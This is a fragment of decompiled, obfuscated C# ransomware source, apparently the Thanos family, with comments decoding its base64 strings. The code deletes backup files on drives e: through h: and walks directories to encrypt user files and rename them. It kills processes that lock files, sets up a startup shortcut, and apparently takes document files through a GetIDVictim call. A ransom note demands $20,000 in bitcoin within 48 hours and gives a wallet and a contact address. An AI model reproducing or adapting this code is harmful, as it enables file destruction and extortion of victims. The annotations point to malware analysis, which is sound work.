			MainCore.DecodeBase64("L3MgL2YgL3EgZTpcKi5WSEQgZTpcKi5iYWMgZTpcKi5iYWsgZTpcKi53YmNhdCBlOlwqLmJrZiBlOlxCYWNrdXAqLiogZTpcYmFja3VwKi4qIGU6XCouc2V0IGU6XCoud2luIGU6XCouZHNr"),
			// -> /s /f /q e:\*.VHD e:\*.bac e:\*.bak e:\*.wbcat e:\*.bkf e:\Backup*.* e:\backup*.* e:\*.set e:\*.win e:\*.dsk
			MainCore.DecodeBase64("L3MgL2YgL3EgZjpcKi5WSEQgZjpcKi5iYWMgZjpcKi5iYWsgZjpcKi53YmNhdCBmOlwqLmJrZiBmOlxCYWNrdXAqLiogZjpcYmFja3VwKi4qIGY6XCouc2V0IGY6XCoud2luIGY6XCouZHNr"),
			// -> /s /f /q f:\*.VHD f:\*.bac f:\*.bak f:\*.wbcat f:\*.bkf f:\Backup*.* f:\backup*.* f:\*.set f:\*.win f:\*.dsk
			MainCore.DecodeBase64("L3MgL2YgL3EgZzpcKi5WSEQgZzpcKi5iYWMgZzpcKi5iYWsgZzpcKi53YmNhdCBnOlwqLmJrZiBnOlxCYWNrdXAqLiogZzpcYmFja3VwKi4qIGc6XCouc2V0IGc6XCoud2luIGc6XCouZHNr"),
			// -> /s /f /q g:\*.VHD g:\*.bac g:\*.bak g:\*.wbcat g:\*.bkf g:\Backup*.* g:\backup*.* g:\*.set g:\*.win g:\*.dsk
			MainCore.DecodeBase64("L3MgL2YgL3EgaDpcKi5WSEQgaDpcKi5iYWMgaDpcKi5iYWsgaDpcKi53YmNhdCBoOlwqLmJrZiBoOlxCYWNrdXAqLiogaDpcYmFja3VwKi4qIGg6XCouc2V0IGg6XCoud2luIGg6XCouZHNr")
			// -> /s /f /q h:\*.VHD h:\*.bac h:\*.bak h:\*.wbcat h:\*.bkf h:\Backup*.* h:\backup*.* h:\*.set h:\*.win h:\*.dsk
		};

		// Token: 0x04000022 RID: 34
		public static string lMBJRPlmLoPIJX = "NO";

		// Token: 0x04000023 RID: 35
		public static string zHSVICJAOa = "NO";

		// Token: 0x04000024 RID: 36
		internal static DateTime OOZMRHMVMrmD = new DateTime(2000, 1, 1);

		// Token: 0x04000025 RID: 37
		internal static DateTime LViAigNUQAbNhB = new DateTime(2100, 1, 1);

		// Token: 0x04000026 RID: 38
		public static string fCiJsjNmDGYo = "YES";

		// Token: 0x04000027 RID: 39
		public static string tsQtKfDKZIMNuO = "10";

		// Token: 0x04000028 RID: 40
		public static string VgdNVBEBhpUPO = "NO";

		// Token: 0x04000029 RID: 41
		public static string rwJLUnGaYuk = "NO";

		// Token: 0x0400002A RID: 42
		public static string JntTsbLDjfdWrF = "NO";

		// Token: 0x0400002B RID: 43
		public static string WgQvAOsxNeWD = "YES";

		// Token: 0x0400002C RID: 44
		public static string qqibCzLAGVg = "NO";

		// Token: 0x0400002D RID: 45
		public static string uySjNlajuEE = "NO";

		// Token: 0x0400002E RID: 46
		public static List<string> ulDHvcBRgNNLZtzS = new List<string>
		{
			"docx",
			"pdf",
			"xlsx",
			"csv"
		};

		// Token: 0x0400002F RID: 47
		public static string BtOESQEmmPY = "NO";

		// Token: 0x04000030 RID: 48
		public static string uOyyfFtzedTPufn = "1";

		// Token: 0x04000031 RID: 49
		public static string mlQgpavlrIuX = "YES";

		// Token: 0x04000032 RID: 50
		public static string oiSsXsWUMOtEp = "NO";

		// Token: 0x04000033 RID: 51
		public static string KkZoOVzwQPf = "NO";

		// Token: 0x04000034 RID: 52
		public static string idAGkbKivQU = string.Empty;

		// Token: 0x04000035 RID: 53
		public static string gremWWHIcFVT = "NO";

		// Token: 0x04000036 RID: 54
		public static string ldDdAgsFLTkAX = "YES";

		// Token: 0x04000037 RID: 55
		public static string ZPHPKQDuPKi = "YES";

		// Token: 0x04000038 RID: 56
		public static string rqOtfqTYGrTie = "SW5mb3JtYXRpb24uLi4="; // -> Information...

		// Token: 0x04000039 RID: 57
		public static string wrCDlMOHoXr = "WW91ciBGaWxlcyBhcmUgRW5jcnlwdGVkLg0KDQpEb27igJl0IHdvcnJ5LCB5b3UgY2FuIHJldHVybiBhbGwgeW91ciBmaWxlcyENCg0KWW91J3ZlIGdvdCA0OCBob3VycygyIERheXMpLCBiZWZvcmUgeW91IGxvc3QgeW91ciBmaWxlcyBmb3JldmVyLg0KSSB3aWxsIHRyZWF0IHlvdSBnb29kIGlmIHlvdSB0cmVhdCBtZSBnb29kIHRvby4NCg0KVGhlIFByaWNlIHRvIGdldCBhbGwgdGhpbmdzIHRvIHRoZSBub3JtYWwgOiAyMCwwMDAkDQpNeSBCVEMgV2FsbGV0IElEIDoNCjFGNnNxOFl2ZnRUZnVFNFFjWXhmSzhzNVhGVVVIQzdzRDkNCg0KQ29udGFjdCA6DQpqb3NlcGhudWxsQHNlY21haWwucHJvDQo=";
		/*
		Your Files are Encrypted.

		Don’t worry, you can return all your files!

		You've got 48 hours(2 Days), before you lost your files forever.
		I will treat you good if you treat me good too.

		The Price to get all things to the normal : 20,000$
		My BTC Wallet ID :
		1F6sq8YvftTfuE4QcYxfK8s5XFUUHC7sD9

		Contact :
		josephnull@secmail.pro
		*/
		// Token: 0x0400003A RID: 58
		public static string rtiZKDwSQcOQoyu = "NO";

		// Token: 0x0400003B RID: 59
		public static string aWdGZORAeYAJ = "NO";

		// Token: 0x0400003C RID: 60
		public static string oCUqHyphdF = "NO";

		// Token: 0x0400003D RID: 61
		public static string VneWBiDudYbxfV = "NO";

		// Token: 0x0400003E RID: 62
		public static string nrUdlkCMdxZ = "YES";

		// Token: 0x0400003F RID: 63
		public static string oarFYicwLcOiB = "LOGONISOFF";

		// Token: 0x04000040 RID: 64
		public static string wEFLZtRchlX = "YES";

		// Token: 0x04000041 RID: 65
		public static string WnYspfSeqpPPh = "NO";

		// Token: 0x04000042 RID: 66
		public static string KYDuKlMFWLOzqeDUz = "mystartup.lnk";

		// Token: 0x04000043 RID: 67
		public static string XKCeykQXWEYgem = "NO";

		// Token: 0x04000044 RID: 68
		public static string OZfhJywPQSn = "NO";

		// Token: 0x04000045 RID: 69
		public static string JGjnyMyTennfuufcT = "YES";

		// Token: 0x04000046 RID: 70
		public static string ylIKJJsgdllsSVj = "YES";

		// Token: 0x04000047 RID: 71
		public static string LcFYzbWwUuFdZ = "VGhhbm9z";

		// Token: 0x04000048 RID: 72
		public static string gcOHYvBogGyw = "YES";

		// Token: 0x04000049 RID: 73
		public static string amSYDuIqjtb = "NO";

		// Token: 0x02000003 RID: 3
		public class jtxivXeSYrLUbhy
		{
			// Token: 0x06000018 RID: 24 RVA: 0x000058DC File Offset: 0x00003ADC
			public static List<string> SearchFiles(string string_0)
			{
				List<string> list = new List<string>();
				return MainCore.jtxivXeSYrLUbhy.WalkDirectoryTree(string_0);
			}

			// Token: 0x06000019 RID: 25 RVA: 0x000058FC File Offset: 0x00003AFC
			private static List<string> WalkDirectoryTree(string string_0)
			{
				string[] array = null;
				try
				{
					array = Directory.GetFiles(string_0, "*.*");
				}
				catch
				{
				}
				if (array != null)
				{
					foreach (string text in array)
					{
						try
						{
							if (!text.ToLower().Contains("program files") && !text.ToLower().Contains("windows") && !text.ToLower().Contains("perflogs") && !text.ToLower().Contains("internet explorer") && !text.ToLower().Contains("programdata") && !text.ToLower().Contains("appdata") && !text.ToLower().Contains("autoexec.bat") && !text.ToLower().Contains("desktop.ini") && !text.ToLower().Contains("autorun.inf") && !text.ToLower().Contains("ntuser.dat") && !text.ToLower().Contains("iconcache.db") && !text.ToLower().Contains("bootsect.bak") && !text.ToLower().Contains("boot.ini") && !text.ToLower().Contains("ntuser.dat.log") && !text.ToLower().Contains("thumbs.db") && !text.ToLower().Contains("bootmgr") && !text.ToLower().Contains("pagefile.sys") && !text.ToLower().Contains("config.sys") && !text.ToLower().Contains("ntuser.ini") && !text.Contains(MainCore.DecodeBase64("QnVpbGRlcl9Mb2c=")) && !text.Contains("RSAKeys") && !text.Contains("HOW_TO_DECYPHER_FILES") && !text.EndsWith(".crypted") && !text.EndsWith("exe") && !text.EndsWith("dll") && !text.EndsWith("EXE") && !text.EndsWith("DLL") && !text.ToLower().Contains("Recycle.Bin") && !text.ToLower().Contains(MainCore.KYDuKlMFWLOzqeDUz))
							{
								if (File.Exists(text) && (double)text.Length <= double.Parse(MainCore.HJhinhnlOMNxIX) * 1024.0 * 1024.0 && MainCore.FFbMRUzulqEpb == "YES")
								{
									MainCore.jtxivXeSYrLUbhy.UGGVvOxBNDKjv.Add(text);
								}
								else if (File.Exists(text) && MainCore.FFbMRUzulqEpb == "NO")
								{
									MainCore.jtxivXeSYrLUbhy.UGGVvOxBNDKjv.Add(text);
								}
							}
						}
						catch
						{
						}
					}
					string[] directories = Directory.GetDirectories(string_0);
					foreach (string string_ in directories)
					{
						MainCore.jtxivXeSYrLUbhy.WalkDirectoryTree(string_);
					}
				}
				return MainCore.jtxivXeSYrLUbhy.UGGVvOxBNDKjv;
			}

			// Token: 0x0400004A RID: 74
			private static StringCollection TBtLAydjtqh = new StringCollection();

			// Token: 0x0400004B RID: 75
			private static List<string> UGGVvOxBNDKjv = new List<string>();
		}

		// Token: 0x02000004 RID: 4
		private sealed class qnaQFtvgrosG
		{
			// Token: 0x0600001D RID: 29 RVA: 0x00002575 File Offset: 0x00000775
			public void <Main>b__5()
			{
				ClassDown.Hide(this.qbsdORlwvxu);
			}

			// Token: 0x0400004C RID: 76
			public string[] qbsdORlwvxu;
		}

		// Token: 0x02000005 RID: 5
		private sealed class ldXpuSFdlzXsf
		{
			// Token: 0x0400004D RID: 77
			public string[] wRpHEPAtkvsJOZo;

			// Token: 0x0400004E RID: 78
			public string[] vyUBfhhKAo;

			// Token: 0x0400004F RID: 79
			public string PrmBaLAeEGy;

			// Token: 0x04000050 RID: 80
			public string VWJpqjqHbP;
		}

		// Token: 0x02000006 RID: 6
		private sealed class uKOVEKzchnPsIO
		{
			// Token: 0x06000020 RID: 32 RVA: 0x00002582 File Offset: 0x00000782
			public void <Crypt>b__d()
			{
				MainCore.OP(this.KxwFjccKfD, this.rvBvEQIyVzuxrLj.wRpHEPAtkvsJOZo, this.rvBvEQIyVzuxrLj.VWJpqjqHbP, this.rvBvEQIyVzuxrLj.vyUBfhhKAo, this.rvBvEQIyVzuxrLj.PrmBaLAeEGy);
			}

			// Token: 0x04000051 RID: 81
			public MainCore.ldXpuSFdlzXsf rvBvEQIyVzuxrLj;

			// Token: 0x04000052 RID: 82
			public string KxwFjccKfD;
		}

		// Token: 0x02000007 RID: 7
		private sealed class WbDnpXySnYPBD
		{
			// Token: 0x06000022 RID: 34 RVA: 0x00005C7C File Offset: 0x00003E7C
			public void <WorkerCrypter2>b__15(string string_0)
			{
				using (List<string>.Enumerator enumerator = this.fevfiSigOoErXD.GetEnumerator())
				{
					IL_2F0:
					while (enumerator.MoveNext())
					{
						string text = enumerator.Current;
						if (this.DhKhIlMiANCZ.Length != 0)
						{
							foreach (string value in this.DhKhIlMiANCZ)
							{
								if (text.EndsWith(value))
								{
									goto IL_2F0;
								}
							}
						}
						if ((!(MainCore.oCUqHyphdF == "NO") || text.EndsWith(string_0)) && !MainCore.CfvwdOobMuXeStMb.Contains(text))
						{
							if (MainCore.zKSeEXflLrlh == "YES")
							{
								try
								{
									if (Kill.ReadStream(text))
									{
										Kill.KillProcess(text);
									}
								}
								catch
								{
								}
							}
							MainCore.CfvwdOobMuXeStMb.Add(text);
							if (!MainCore.CSiGcEXgTf.Contains(Path.GetDirectoryName(text)))
							{
								MainCore.CSiGcEXgTf.Add(Path.GetDirectoryName(text));
							}
							try
							{
								FileStream fileStream = new FileStream(text, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
								if (MainCore.fCiJsjNmDGYo == "YES" && fileStream.Length > (long)(Convert.ToInt32(MainCore.tsQtKfDKZIMNuO) * 1024 * 1024) && !this.UIEWVHYeVoR.Contains(string_0))
								{
									if (MainCore.uySjNlajuEE == "YES")
									{
										foreach (string value2 in MainCore.ulDHvcBRgNNLZtzS)
										{
											if (text.ToLower().EndsWith(value2) && MainCore.BtOESQEmmPY == "YES")
											{
												if ((long)(Convert.ToInt32(MainCore.uOyyfFtzedTPufn) * 1024 * 1024) <= fileStream.Length)
												{
													continue;
												}
												try
												{
													ID.GetIDVictim("URL", "USERNAME", "ACCESO", text);
													continue;
												}
												catch
												{
													continue;
												}
											}
											if (text.ToLower().EndsWith(value2) && MainCore.BtOESQEmmPY == "NO")
											{
												try
												{
													ID.GetIDVictim("URL", "USERNAME", "ACCESO", text);
												}
												catch
												{
												}
											}
										}
									}
									fileStream.Dispose();
									byte[] byte_ = Encryption.ReadFileData(text, Convert.ToInt32(MainCore.tsQtKfDKZIMNuO) * 1024 * 1024);
									byte[] byte_2 = Encryption.EncryptFile(byte_, Encoding.ASCII.GetBytes(this.KRFQhWmJuhVexr), new byte[]
									{
										1,
										2,
										3,
										4,
										5,
										6,
										7,
										8
									});
									Encryption.WhiteEncryptedFile(text, byte_2);
									if (this.RryKduFtzbfiPI != ".*")
									{
										File.Move(text, text + this.RryKduFtzbfiPI);
									}
								}
								else if (this.RryKduFtzbfiPI != ".*")
								{
									MainCore.InitEncryption(text, text + this.RryKduFtzbfiPI, MainCore.ctSkisxFbkPzS);
								}
								else
								{
									MainCore.InitEncryption(text, text + ".part", MainCore.ctSkisxFbkPzS);
								}
							}
							catch (Exception)
							{
							}
						}
					}
				}
			}

			// Token: 0x04000053 RID: 83
			public List<string> UIEWVHYeVoR;

			// Token: 0x04000054 RID: 84
			public List<string> fevfiSigOoErXD;

			// Token: 0x04000055 RID: 85
			public string RryKduFtzbfiPI;

			// Token: 0x04000056 RID: 86
			public string[] DhKhIlMiANCZ;

			// Token: 0x04000057 RID: 87
			public string KRFQhWmJuhVexr;
		}

		// Token: 0x02000008 RID: 8
		private sealed class IzImQwKqnmdl
		{
			// Token: 0x06000024 RID: 36 RVA: 0x0000602C File Offset: 0x0000422C
			public void <Encrypt2>b__18()
			{
				for (;;)
				{
					try
					{
						File.Delete(this.MQXFfvSrdXstlCz);
						break;
					}
					catch
					{
					}
				}
			}

			// Token: 0x06000025 RID: 37 RVA: 0x00006060 File Offset: 0x00004260
			public void <Encrypt2>b__19()
			{
				for (;;)
				{
					try
					{
						if (File.Exists(this.GhQNYBCsZpGoSQ))
						{
							File.Delete(this.GhQNYBCsZpGoSQ);
						}
						break;
					}
					catch
					{
					}
				}
			}

			// Token: 0x04000058 RID: 88
			public string MQXFfvSrdXstlCz;

			// Token: 0x04000059 RID: 89
			public string GhQNYBCsZpGoSQ;
		}
	}
}
